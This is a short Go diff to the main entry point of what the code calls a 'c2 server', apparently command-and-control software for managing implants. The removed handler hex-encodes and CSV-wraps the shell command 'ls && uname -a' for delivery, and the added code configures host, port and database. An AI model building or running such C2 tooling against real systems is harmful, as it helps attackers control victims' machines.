@@ -1,21 +1,27 @@
 package main
 
 import (
-	"encoding/hex"
+	"c2/db"
+	"common/utils"
+	"flag"
+	"net"
 	"net/http"
+)
 
-	"github.com/zarkones/netescape"
+var (
+	host   = flag.String("host", "0.0.0.0", "host of the c2 server")
+	port   = flag.String("port", "8000", "port of the c2 server")
+	dbName = flag.String("db-name", "database.sqlite", "path to the database")
 )
 
 func main() {
+	flag.Parse()
+
+	utils.MaybeFatal(db.Init(*dbName))
+
 	r := http.NewServeMux()
 
-	r.HandleFunc("GET /something", func(w http.ResponseWriter, r *http.Request) {
-		payload := "ls && uname -a"
-		h := hex.EncodeToString([]byte(payload))
-		csv, _ := netescape.ToCsv(&h)
-		w.Write([]byte(csv))
-	})
+	initRouting(r)
 
-	http.ListenAndServe("0.0.0.0:8000", r)
+	utils.MaybeFatal(http.ListenAndServe(net.JoinHostPort(*host, *port), r))
 }
